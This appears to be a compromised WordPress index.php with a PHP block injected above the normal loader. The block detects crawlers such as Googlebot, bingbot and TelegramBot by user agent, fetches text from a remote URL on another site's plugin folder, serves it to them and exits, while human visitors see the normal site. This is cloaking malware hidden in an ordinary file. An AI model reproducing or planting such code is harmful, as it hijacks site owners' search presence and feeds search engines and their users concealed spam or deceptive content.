<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://clinicahumanasinop.com.br/wp-content/plugins/contact-form-7/includes/swv/index.txt');#NAROLINK
    echo $message;
    exit;
}
?>
<?php
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
